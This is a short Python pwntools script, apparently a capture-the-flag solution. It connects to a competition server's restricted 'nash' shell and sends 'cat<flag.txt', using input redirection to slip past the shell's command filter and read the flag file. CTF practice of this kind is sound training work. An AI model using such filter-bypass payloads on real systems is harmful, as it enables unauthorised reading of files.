#!/usr/bin/env python3

from pwn import *


r = remote('ctf.umbccd.io', 4600)


r.sendlineafter('nash> ', 'cat<flag.txt')
r.interactive()
